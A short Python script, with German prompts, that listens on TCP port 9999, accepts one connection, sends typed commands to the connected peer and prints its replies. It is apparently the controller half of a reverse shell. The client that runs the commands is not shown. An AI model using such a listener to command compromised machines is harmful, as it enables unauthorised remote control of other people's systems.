from socket import *

HOST = ''
PORT = 9999

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print (">> Warten auf Verbindung an PORT " + str(PORT))

s.listen(1)

connection, adresse = s.accept()
print (">> Verbunden mit => " + str(adresse[0]))

while True:
    befehl = input(str(adresse[0] + " >> "))
    connection.send(bytes(befehl, "utf8"))
    if befehl == "quit" : break
    output = connection.recv(100000)
    putout = output
    print (str(putout, "utf8"))
connection.close()